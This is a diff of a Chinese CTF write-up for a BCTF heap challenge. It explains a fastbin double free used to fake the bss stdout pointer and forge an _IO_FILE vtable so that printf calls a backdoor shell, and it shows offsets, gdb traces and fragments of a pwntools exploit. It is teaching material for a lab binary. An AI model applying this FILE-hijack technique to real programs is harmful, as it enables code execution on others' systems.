@@ -9,7 +9,7 @@ TCL TCL
 BCTF的easiest...感觉自己对IO_FILE的理解还是太浅了..
 看了一遍vfprintf的源码感觉对整个函数的了解加深了不少..
 关于bss上的stdoutstdin的作用还是不太清楚
-[附件][2]
+[附件][2]
 # Analysis
 
 checksec
@@ -29,10 +29,10 @@ checksec
 ```
 uaf 
 主要考察的是利用...
-因为没有输出要么partial write要么用仅知的bss的地址
+因为没有输出要么partial write要么用仅知的bss的地址
 一开始路走错了以为没有got可以hijacking....
 还以为是partial write改写 stdout的_flags
-因为输入的时候输入函数的限制:要么被/x00截断要么只写一个0x0a在这想办法绕过这个上面花了太多时间...
+因为输入的时候输入函数的限制:要么被/x00截断要么只写一个0x0a在这想办法绕过这个上面花了太多时间...
 
 ```arm
 idx = 0;
@@ -61,7 +61,7 @@ idx = 0;
 进而学习了一波stdout
 
 
-这题主要是控制bss上的stdout看了源码之后我感觉很神奇...为啥puts用的是_IO_stdout
+这题主要是控制bss上的stdout看了源码之后我感觉很神奇...为啥puts用的是_IO_stdout
 也就是真的stdout..
 ```arm
 _IO_puts (const char *str)
@@ -94,19 +94,19 @@ __printf (const char *format, ...)
 
 * 控制bss上的stdout
 * 伪造jumptable
-* 利用输出call jumptable 的 _IO_sputn getshell
+* 利用输出call jumptable 的 _IO_sputn getshell
 
 
-# printf
+# printf
 主要功能实现在vfprintf
-很厉害的一个函数...借着做这题的契机就着[mut3p1g的分析][1]大致读了一遍vfprintf的源码
+很厉害的一个函数...借着做这题的契机就着[mut3p1g的分析][1]大致读了一遍vfprintf的源码
 
-深感自己功力不足对vfprintf了解还不够...现在还无法分析这个函数
-
+深感自己功力不足对vfprintf了解还不够...现在还无法分析这个函数
+
 这里简要谈几点：
-* 函数主要是在处理format串
+* 函数主要是在处理format串
 * 先把第一个% 前的东西输出到一个buffer中
-* 解析% 后的东西，主要分为初始化，对输出宽度，精度处理，类型转换处理
+* 解析% 后的东西，主要分为初始化，对输出宽度，精度处理，类型转换处理
 * 输出主要是靠buffered_vfprintf
 
 所以此题需要的函数也就是buffered_vfprintf 
@@ -114,7 +114,7 @@ __printf (const char *format, ...)
 buffered_vfprintf (FILE *s, const CHAR_T *format, va_list args)
 ```
 函数开始定义了一些类型与变量
-并设置一些输出相关值
+并设置一些输出相关值
 主要的输出部分在这里
 ```c
   /* Now flush anything from the helper to the S. */
@@ -154,16 +154,16 @@ struct _IO_jump_t
     JUMP_FIELD(_IO_xsputn_t, __xsputn);
     ...
 ```
-# 思路
+# 思路
 这里我们先算出几个重要的偏移(做多了一般就会记住了)
 ```python
-off1=0xd8#vtable‘s off 也就是n132>>> p sizeof(_IO_FILE)
+off1=0xd8#vtable‘s off 也就是n132>>> p sizeof(_IO_FILE)
 off2=8*8#_IO_xsputn_t
 ```
 
 然后整理一下思路
-* 我们可以通过double free做fastbin atk控制bss
-* 控制的地址比较高做不了hijacking但是可以控制bss上的stdout恰好有个printf在输入cmd的时候
+* 我们可以通过double free做fastbin atk控制bss
+* 控制的地址比较高做不了hijacking但是可以控制bss上的stdout恰好有个printf在输入cmd的时候
 * stdout改到bss上
 * vtavle可以用我们malloc的chunk来伪造 
 * 中间还需要做一些事情让我们顺利执行buffered_vfprintf的输出部分
@@ -171,7 +171,7 @@ off2=8*8#_IO_xsputn_t
 address of fake_stdout: &ponit_of_chunk_vtable-0xd8
 chunk_vtable: '\x00'*56+p64(sh)
 
-这里记录几个容易有问题的地方:
+这里记录几个容易有问题的地方:
 I.
 ```arm
    0x7ffff7a7f8db <vfprintf+27>    mov    eax, dword ptr fs:[rax]
@@ -180,7 +180,7 @@ I.
  ► 0x7ffff7a7f8ea <vfprintf+42>    test   eax, eax
    0x7ffff7a7f8ec <vfprintf+44>    jne    vfprintf+288 <0x7ffff7a7f9e0>
 ```
-vfprintf的第一个check...这个要是过不了直接没啥好玩的了..注意置0就可以了
+vfprintf的第一个check...这个要是过不了直接没啥好玩的了..注意置0就可以了
 
 II.
 ```arm
@@ -196,10 +196,10 @@ II.
    0x7ffff7a7f916 <vfprintf+86>     mov    r12, rsi
    0x7ffff7a7f919 <vfprintf+89>     mov    rbx, rdi
 ```
-发现运气超好..后门的地址恰好可以过如果不过了的话还要自己想办法过掉call b ffered_vfprintf
+发现运气超好..后门的地址恰好可以过如果不过了的话还要自己想办法过掉call b ffered_vfprintf
 
 III.
-在这里卡了半天...因为我在一般的chunk里面乱写东西...最好置0
+在这里卡了半天...因为我在一般的chunk里面乱写东西...最好置0
 ```arm
   0x7ffff7a82682 <buffered_vfprintf+210>    mov    esi, 1
    0x7ffff7a82687 <buffered_vfprintf+215>    cmp    dword ptr [rip + 0x3570f2], 0 <0x7ffff7dd9780>
@@ -218,9 +218,9 @@ cmpxchg是汇编指令
 如：CMPXCHG r/m,r 将累加器AL/AX/EAX/RAX中的值与首操作数（目的操作数）比较，如果相等，第2操作数（源操作数）的值装载到首操作数，zf置1。如果不等， 首操作数的值装载到AL/AX/EAX/RAX并将zf清0
 ```
 
-过了之后就会调后门
+过了之后就会调后门
 
-# exp
+# exp
 ```python
 from pwn import *
 def cmd(c):
@@ -256,11 +256,11 @@ gdb.attach(p,'b *0x7ffff7a8269b')
 cmd("nier")
 p.interactive()
 ```
-
+
 
 # end
 ## I
-main.c
+main.c
 ```c
 #include<stdio.h>
 int main()
@@ -281,9 +281,9 @@ printf("nier");
    0x7ffff7a628a0 <printf+160>    ret    
 
 ```
-此时rax是指向libc的某处 用的是libc上的..并且bss上没有stdout@libc
+此时rax是指向libc的某处 用的是libc上的..并且bss上没有stdout@libc
 ## II
-将源码改成
+将源码改成
 ```c
 #include<stdio.h>
 int main()
@@ -312,9 +312,9 @@ printf("nier");
 指向了bss上stdout...
 
 ## III & IV
-为了验证puts我也做了puts的实验发现确实源码不会说谎puts一直用的是libc上的stdout
-
-不知是用bss上stdout的备份有特殊用途还是glibc编写时的一个漏洞.
+为了验证puts我也做了puts的实验发现确实源码不会说谎puts一直用的是libc上的stdout
+
+不知是用bss上stdout的备份有特殊用途还是glibc编写时的一个漏洞.
 
 
 
